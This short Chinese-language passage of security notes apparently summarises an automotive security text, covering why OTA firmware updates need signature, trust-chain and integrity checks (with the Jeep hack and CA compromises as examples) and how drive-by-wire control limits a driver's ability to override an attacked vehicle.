- **在 OTA 升级链路里必须验证签名 + 信任链 + 完整性**：作者用 Jeep 作为反例——"IOC 并没有使用数字签名验证固件是否合法或者防自改"，导致 OMAP root 后可直接刷篡改固件；若 Root CA 私钥泄露（如 DigiNotar 事件），整个信任链崩塌；签名校验若只在应用层做而非引导层做，攻击者可刷一个绕过校验的引导程序再刷恶意应用固件；作者警告"CA 非法签发案例"——法国财政部曾签发假冒 Google 证书做中间人攻击，说明 CA 本身也可能不可信
- **用 ECU 闭环控制原理判断攻击后果严重性**：作者警告"具有线控功能的汽车被黑客控制后可能连驾驶员都不能重写某些功能"——不能假设驾驶员总能机械干预；自动驾驶模式下驾驶员注意力不集中，即使可 Override 也可能来不及；某些线控系统保留机械备份（如线控转向的应急离合器），但备份是否生效需逐车型验证
